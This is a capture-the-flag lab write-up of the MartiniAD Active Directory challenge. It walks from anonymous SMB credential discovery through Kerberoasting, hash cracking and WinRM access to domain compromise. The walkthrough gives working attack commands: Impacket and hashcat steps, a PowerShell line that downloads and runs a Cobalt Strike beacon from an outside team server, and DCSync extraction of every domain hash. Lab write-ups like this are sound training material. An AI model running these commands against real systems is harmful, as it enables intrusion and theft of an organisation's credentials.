---
title: MartiniAD Writeup - HackSmarter Labs
description: Detailed writeup for the MartiniAD Active Directory challenge from HackSmarter Labs.
author: drewbyte
date: 2026-05-27 00:00:00 +0800
categories: [writeup, lab]
tags: [writeup, lab, activedirectory, kerberoasting, cobalt-strike, dcsync, password-reuse]
image:
  path: /assets/img/martiniad.png
  alt: MartiniAD

---

An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The HackSmarter team has been authorized to perform an internal black box pentest. Starting with VPN access to the internal network and no credentials, the objective was full domain compromise.

#### The Target:
```
10.1.21.72 (DC01.DRY.MARTINI.BARS)
```

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [DNS Enumeration](#dns-enumeration)
3. [SMB Enumeration & Initial Credentials](#smb-enumeration--initial-credentials)
4. [Kerberoasting](#kerberoasting)
5. [Hash Cracking](#hash-cracking)
6. [Initial Access via Evil-WinRM](#initial-access-via-evil-winrm)
7. [Cobalt Strike Beacon Deployment](#cobalt-strike-beacon-deployment)
8. [Domain Enumeration](#domain-enumeration)
9. [Password Reuse & Privilege Escalation](#password-reuse--privilege-escalation)
10. [DCSync & Domain Compromise](#dcsync--domain-compromise)

---

## Enumeration

Initial enumeration was performed using Nmap against the target IP `10.1.21.72`. The scan identified a Windows Domain Controller running Windows Server 2025.

```bash
sudo nmap -AF 10.1.21.72
```

Key open ports identified:

| Port | Service |
|------|---------|
| 53   | DNS (Simple DNS Plus) |
| 88   | Kerberos |
| 135  | MSRPC |
| 139  | NetBIOS |
| 389  | LDAP — Domain: `DRY.MARTINI.BARS` |
| 445  | SMB — signing enabled but **not required** |
| 3389 | RDP — `DC01.DRY.MARTINI.BARS` |

The scan confirmed the target as `DC01` and revealed the domain `DRY.MARTINI.BARS`. SMB signing being enabled but not required is a notable finding for potential relay attacks.

---

## DNS Enumeration

After adding the domain to `/etc/hosts`, DNS was queried directly against the DC.

```bash
dig dry.martini.bars @10.1.21.72
dig any dry.martini.bars @10.1.21.72
dig axfr dry.martini.bars @10.1.21.72
```

The zone transfer attempt failed — the DC was properly locked down. However the `ANY` query revealed three IP addresses registered under `DRY.MARTINI.BARS`:

- `10.1.21.72` — DC01 (primary target)
- `10.1.133.16` — unknown
- `10.1.122.198` — unknown

Reverse lookups against the two additional IPs returned no PTR records, suggesting stale DNS entries. Focus remained on `10.1.21.72`.

---

## SMB Enumeration & Initial Credentials

Anonymous SMB enumeration was performed against the target, revealing a non-default share named `notes`.

```bash
smbclient -L //10.1.21.72 -N
```

Shares discovered:

| Share    | Permissions  | Remark |
|----------|--------------|--------|
| ADMIN$   | —            | Remote Admin |
| C$       | —            | Default share |
| IPC$     | READ         | Remote IPC |
| NETLOGON | READ         | Logon server share |
| **notes**| **READ,WRITE** | — |
| SYSVOL   | READ         | Logon server share |

The `notes` share was immediately identified as non-standard and accessed anonymously. A file named `notes.txt` was discovered and downloaded.

```bash
smbclient //10.1.21.72/notes -N -c "get notes.txt /tmp/notes.txt"
cat /tmp/notes.txt
```

The file contained plaintext credentials:

```
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint
creds
mprice:[REDACTED]
```

Credentials were validated using CrackMapExec:

```bash
crackmapexec smb 10.1.21.72 -u mprice -p '[REDACTED]' -d DRY.MARTINI.BARS
crackmapexec winrm 10.1.21.72 -u mprice -p '[REDACTED]' -d DRY.MARTINI.BARS
```

![](/assets/img/martiniad_mprice_smb.png){: .mx-auto.d-block width="800px" }

SMB returned `[+]` confirming valid credentials for `mprice`. WinRM access was denied — `mprice` is not a member of Remote Management Users.

---

## Kerberoasting

With valid credentials for `mprice`, domain user and share enumeration was performed revealing the following accounts and accessible shares.

```bash
crackmapexec smb 10.1.21.72 -u mprice -p '[REDACTED]' -d DRY.MARTINI.BARS --shares
crackmapexec smb 10.1.21.72 -u mprice -p '[REDACTED]' -d DRY.MARTINI.BARS --users
```

![](/assets/img/martiniad_users.png){: .mx-auto.d-block width="800px" }

Domain users identified:

- `Administrator`
- `Guest`
- `krbtgt`
- `mprice`
- `athena.t0`
- `ATHENA_SVC`

`ATHENA_SVC` was identified as a service account and a member of **Remote Management Users**. Kerberoasting was performed using Impacket's `GetUserSPNs`:

```bash
impacket-GetUserSPNs DRY.MARTINI.BARS/mprice:'[REDACTED]' -dc-ip 10.1.21.72 -request
```

A TGS-REP hash was successfully retrieved for `ATHENA_SVC` with SPN `HTTP/athena.dry.martini.bar`:

```
$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS/ATHENA_SVC*$[REDACTED]
```

---

## Hash Cracking

The retrieved TGS hash was saved to a file and cracked offline using Hashcat mode `13100` with the `rockyou.txt` wordlist:

```bash
echo '$krb5tgs$23$*ATHENA_SVC...' > /tmp/athena_hash.txt
hashcat -m 13100 /tmp/athena_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 /tmp/athena_hash.txt /usr/share/wordlists/rockyou.txt --show
```

The hash was successfully cracked:

```
ATHENA_SVC:[REDACTED]
```

---

## Initial Access via Evil-WinRM

With valid credentials for `ATHENA_SVC` and its membership in **Remote Management Users**, WinRM access was confirmed and a shell was obtained:

```bash
crackmapexec winrm 10.1.21.72 -u ATHENA_SVC -p '[REDACTED]' -d DRY.MARTINI.BARS
evil-winrm -i 10.1.21.72 -u ATHENA_SVC -p '[REDACTED]'
```

![](/assets/img/martiniad_winrm.png){: .mx-auto.d-block width="800px" }

A shell was established as `ATHENA_SVC` on `DC01`.

---

## Cobalt Strike Beacon Deployment

A Cobalt Strike HTTP listener was configured with the team server at `10.200.60.67` on port `80`. A beacon payload was generated and hosted via Cobalt Strike's built-in web server.

![](/assets/img/martiniad_cs_setup.png){: .mx-auto.d-block width="800px" }

From the Evil-WinRM session, the beacon was downloaded and executed on the target:

```powershell
Invoke-WebRequest -Uri "http://10.200.60.67:80/beacon.exe" -OutFile "$env:APPDATA\beacon.exe"
& "$env:APPDATA\beacon.exe"
```

A beacon callback was received confirming execution as `DRY\ATHENA_SVC` on `DC01` — x64, PID 4544.

![](/assets/img/martiniad_beacon.png){: .mx-auto.d-block width="800px" }

---

## Domain Enumeration

With an active beacon, domain enumeration was performed via built-in `shell` commands and `execute-assembly`.

```
shell net group "Domain Admins" /domain
shell net user athena.t0 /domain
shell net user ATHENA_SVC /domain
shell net group /domain
```

Domain Admins confirmed as `Administrator` and `athena.t0`. The `athena.t0` account follows a **Tier 0** naming convention indicating a privileged administrative account with the following group memberships:

- `Domain Admins`
- `Remote Desktop Users`
- `Remote Management Users`

SharpHound was executed via `execute-assembly` to collect AD relationship data for BloodHound analysis:

```
execute-assembly /home/kali/Tools/SharpCollection/NetFramework_4.5_Any/SharpHound.exe -c All --zipfilename bh_output.zip --outputdirectory C:\Users\ATHENA_SVC\AppData\Roaming
```

![](/assets/img/martiniad_sharphound.png){: .mx-auto.d-block width="800px" }

SharpHound completed enumeration of 62 objects across the `DRY.MARTINI.BARS` domain. Seatbelt was also run for local recon revealing key findings:

- `RunAsPPL : 0` — LSA protection disabled, LSASS dump possible
- `LAPS Enabled : False` — no LAPS configured
- Windows Firewall `DefaultInboundAction : ALLOW`

---

## Password Reuse & Privilege Escalation

Observing that `athena.t0` shares a similar naming convention with `ATHENA_SVC`, password reuse was tested using the cracked `ATHENA_SVC` password against the Domain Admin account:

```bash
crackmapexec smb 10.1.21.72 -u 'athena.t0' -p '[REDACTED]' -d DRY.MARTINI.BARS
```

Authentication was successful — `athena.t0` reused the same password as `ATHENA_SVC`. CrackMapExec confirmed `(Pwn3d!)`.

In Cobalt Strike, the `make_token` command was used to impersonate `athena.t0` within the existing beacon session without spawning a new process:

```
make_token DRY\athena.t0 [REDACTED]
```

---

## DCSync & Domain Compromise

With `athena.t0` impersonated via token, DCSync was performed using Cobalt Strike's built-in Mimikatz integration to extract domain credentials:

```
dcsync DRY.MARTINI.BARS DRY\krbtgt
dcsync DRY.MARTINI.BARS
```

All domain hashes were successfully extracted:

| User | NTLM Hash |
|------|-----------|
| `krbtgt` | `[REDACTED]` |
| `Administrator` | `[REDACTED]` |
| `DC01$` | `[REDACTED]` |
| `mprice` | `[REDACTED]` |
| `ATHENA_SVC` | `[REDACTED]` |
| `athena.t0` | `[REDACTED]` *(same hash as ATHENA_SVC — confirms password reuse)* |

The identical NTLM hashes for `athena.t0` and `ATHENA_SVC` definitively confirmed password reuse. With the `krbtgt` hash obtained, a **Golden Ticket** attack is now possible granting persistent and stealthy domain-level access indefinitely.

---

Full domain compromise achieved. The attack chain:

1. Anonymous SMB access exposed a `notes` share with plaintext credentials for `mprice`
2. Valid credentials enabled Kerberoasting, yielding a crackable TGS hash for `ATHENA_SVC`
3. `ATHENA_SVC` credentials provided WinRM access and a Cobalt Strike beacon on `DC01`
4. Password reuse between `ATHENA_SVC` and the Domain Admin `athena.t0` enabled privilege escalation
5. DCSync via token impersonation extracted the entire domain's credential material including `krbtgt`

